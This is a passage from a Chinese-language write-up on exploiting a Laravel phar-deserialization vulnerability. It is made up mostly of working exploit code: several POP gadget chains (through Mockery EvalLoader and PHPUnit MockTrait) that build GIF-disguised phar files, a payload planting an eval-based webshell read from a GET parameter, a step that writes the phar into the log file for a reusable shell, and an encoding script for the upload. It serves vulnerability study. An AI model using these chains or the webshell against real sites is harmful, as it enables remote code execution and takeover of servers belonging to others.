        $phar = new Phar("ricky2.phar"); //生成phar文件
        $phar->startBuffering();
        $phar->setStub('GIF89a'.'');
        $phar->setMetadata($a); //触发头是C1e4r类
        $phar->addFromString("test.txt", "test"); //生成签名
        $phar->stopBuffering();
    }
按照上面的步骤执行 phar 反序列化在 public 目录下生成 shell, 即可执行
## POP链3
尝试直接命令执行的类, 有之前就出现在 laravel5 反序列化中的 `EvalLoader` 类, 建立 phar 反序列化
    events=$events;
                $this->event=$event;
            }
        }
    }
    namespace Illuminate\Foundation\Console {
        class QueuedCommand
        {
            public $connection;
            public function __construct($connection) {
                $this->connection = $connection;
            }
        }
    }
    namespace Illuminate\Bus {
        class Dispatcher {
            protected $queueResolver;
            public function __construct($queueResolver){
                $this->queueResolver = $queueResolver;
            }
        }
    }
    namespace Mockery\Loader {
        class EvalLoader {
        }
    }
    namespace Mockery\Generator {
        class MockDefinition {
            protected $code;
            protected $config;
            public function __construct($code, $config) {
                $this->code = $code;
                $this->config = $config;
            }
        }
        class MockConfiguration {
            protected $name = "ricky";
        }
    }
    namespace {
        $d = new Mockery\Generator\MockDefinition('', new Mockery\Generator\MockConfiguration());
        $c = new Illuminate\Foundation\Console\QueuedCommand($d);
        $b = new Illuminate\Bus\Dispatcher([new Mockery\Loader\EvalLoader(), 'load']);
        $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);
        $phar = new Phar("ricky3.phar"); //生成phar文件
        $phar->startBuffering();
        $phar->setStub('GIF89a'.'');
        $phar->setMetadata($a); //触发头是C1e4r类
        $phar->addFromString("test.txt", "test"); //生成签名
        $phar->stopBuffering();
    }
然后依照上面的流程走一遍, 就可以达成命令执行的效果
## POP链4
全局搜索 `__destruct()`, 常用的有很多, 像是 `PendingBroadcast` 类,
`PendingResourceRegistration` 类还有 `ImportConfigurator` 类, 用于触发 `__call` 方法,
这次调用的是 Mock 类里面的 `generate()` 方法
    # MockClass.php
        public function generate(): string
        {
            if (!class_exists($this->mockName, false)) {
                eval($this->classCode);  # $this->classCode 可控
                call_user_func(
                    [
                        $this->mockName,
                        '__phpunit_initConfigurableMethods',
                    ],
                    ...$this->configurableMethods
                );
            }
            return $this->mockName;
        }
    # MockTrait.php
        public function generate(): string
        {
            if (!class_exists($this->mockName, false)) {
                eval($this->classCode);
            }
            return $this->mockName;
        }
只需要使 `$mockName` 这个类不存在即可, 而且该参数可控, `$this->classCode` 也可控, 向上回溯找到调用 Mock
类的函数, 在 `Mockery/HigherOrderMessage.php` 的 `__call` 方法中
        public function __call($method, $args)
        {
            if ($this->method === 'shouldNotHaveReceived') {
                return $this->mock->{$this->method}($method, $args);
            }
            $expectation = $this->mock->{$this->method}($method);  // 调用 mock 类
            return $expectation->withArgs($args);
        }
特别的凑巧, 我们也需要调用 `__call()` 方法, 所以一条 POP 链就形成了
    class ImportConfigurator() -> __destruct()
    ↓↓↓
    class HigherOrderMessage() -> __call()
    ↓↓↓
    class MockClass() -> generate() 或者 class MockTrait() -> generate()
建立 exp.php, 生成 phar 文件调用 phpinfo
    parent = $parent;
                $this->test = 'undefined';
            }
        }
    }
    namespace Mockery {
        class HigherOrderMessage {
            private $mock;
            private $method;
            public function __construct($mock) {
                $this->mock = $mock;
                $this->method = 'generate';  // 调用 mock 类的 generate 方法
            }
        }
    }
    namespace PHPUnit\Framework\MockObject {
        class MockTrait {
            private $classCode;
            private $mockName;
            public function __construct($classCode) {
                $this->classCode = $classCode;
                $this->mockName = 'undefined';  // 控制 $mockname 为不存在的类
            }
        }
    }
    namespace {
        use Mockery\HigherOrderMessage;
        use PHPUnit\Framework\MockObject\MockTrait;
        use Symfony\Component\Routing\Loader\Configurator\ImportConfigurator;
        $c = new MockTrait("phpinfo(); echo 'Ricky in serialize!'; eval(filter_input(INPUT_GET,\"ricky\"));");
        $b = new HigherOrderMessage($c);
        $a = new ImportConfigurator($b);
        $phar = new Phar("ricky1.phar"); //生成phar文件
        $phar->startBuffering();
        $phar->setStub('GIF89a'.'');
        $phar->setMetadata($a); //触发头是C1e4r类
        $phar->addFromString("test.txt", "test"); //生成签名
        $phar->stopBuffering();
    }
不过测试了一下, 高版本的 `ImportConfigurator` 类会返回 `Cannot unserialize` 的提示, 那我们就用
`PendingResourceRegistration` 类
    registrar = $registrar;
                $this->name = $name;
                $this->controller = $controller;
                $this->options = $options;
            }
        }
    }
    namespace Mockery {
        class HigherOrderMessage {
            private $mock;
            private $method;
            public function __construct($mock) {
                $this->mock = $mock;
                $this->method = 'generate';  // 调用 mock 类的 generate 方法
            }
        }
    }
    namespace PHPUnit\Framework\MockObject {
        class MockTrait {
            private $classCode;
            private $mockName;
            public function __construct($classCode) {
                $this->classCode = $classCode;
                $this->mockName = 'undefined';  // 控制 $mockname 为不存在的类
            }
        }
    }
    namespace {
        use Mockery\HigherOrderMessage;
        use PHPUnit\Framework\MockObject\MockTrait;
        use Illuminate\Routing\PendingResourceRegistration;
        $c = new MockTrait("phpinfo(); echo 'Ricky in serialize!'; eval(filter_input(INPUT_GET,\"ricky\"));");
        $b = new HigherOrderMessage($c);
        $a = new PendingResourceRegistration($b, 'ricky', 'ricky', 'ricky');
        $phar = new Phar("ricky1.phar"); //生成phar文件
        $phar->startBuffering();
        $phar->setStub('GIF89a'.'');
        $phar->setMetadata($a); //触发头是C1e4r类
        $phar->addFromString("test.txt", "test"); //生成签名
        $phar->stopBuffering();
    }
然后我们尝试建立一个新的 log 文件循环调用 phar 文件
    $code = base64_encode(file_get_contents("./ricky1.phar"));
    $c = new MockTrait("phpinfo(); echo 'Ricky in serialize!'; file_put_contents('/var/www/html/storage/logs/ricky.log',base64_decode('{$code}'));");
然后按照上面的步骤触发反序列化
然后触发我们的另一个 log 文件进行 phar 反序列化
这样就实现了循环调用的 shell
**疑点: phar完成转换后payload太长了能否截断上传?**
因为是 base64 字符, 首先至少要满足能被 4 整除, 然后再尝试上传拼接的 payload, 我就对了一个比较短的 exp 进行了二次分割上传,
发现截断应该是解码后产生了换行, 文件损坏了就无法执行 phar 反序列化了
如果网站有字数上传限制的话那么可能就无法成功执行
最后再附上一个可以将payload直接转换后写入文档的文件, 制作好以后就可以直接生成payload
    <?php
    function TransferPhar($file){
        $endfile = fopen("phar.txt", "w");
        $raw = base64_encode(file_get_contents($file));
        $result = array();
        for($i = 0; $i < strlen($raw); $i++){
            $result[$i] = "=" . strtoupper(dechex(ord($raw[$i]))) . "=00";
        }
        fwrite($endfile, implode($result));
        fclose($endfile);
    }
    TransferPhar('./ricky.phar');
## 小结
总结一下:
  * 第一步做的是建立 log 文件, 也就是使 `file_get_contents()` 读取文件报错得到 log 文件
  * 第二步是清空 log 文件, 通过报错上传我们的payload, 然后就是经过多个过滤器的篡改得到 phar 文件
  * 第三步是执行 phar 反序列化拿到shell
总体来说 laravel 反序列化考的还是对 POP 链的挖掘, 这次的 CVE 相当于多了一个无形的反序列化点, 多个过滤器配合过滤也是十分巧妙,
也算是进一步对 laravel 框架有了个全面的了解.
感谢各位读者可以耐心地读到这里, 希望您对该漏洞有了更深刻的认识, 可能有还没汇总全的, 希望各位师傅踊跃提出!